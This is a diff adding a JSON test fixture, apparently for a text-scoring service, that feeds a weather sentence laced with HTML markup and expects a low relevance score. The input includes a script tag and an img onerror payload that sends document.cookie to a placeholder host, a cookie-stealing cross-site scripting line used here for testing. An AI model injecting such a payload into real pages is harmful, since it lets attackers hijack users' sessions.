@@ -1,0 +1,11 @@
+{
+  "name": "html_and_script_markup",
+  "source": "added, Phase 5 Round 2",
+  "sector_id": "naboo",
+  "description": "It rained today. <script>alert(\"rain\")</script> <img src=x onerror=\"fetch('//example.invalid/?c='+document.cookie)\"> <b>Very</b> wet.",
+  "expect": {
+    "outcome": "scored",
+    "relevance": {"lt": 0.15},
+    "max_abs_sigma": 2.0
+  }
+}
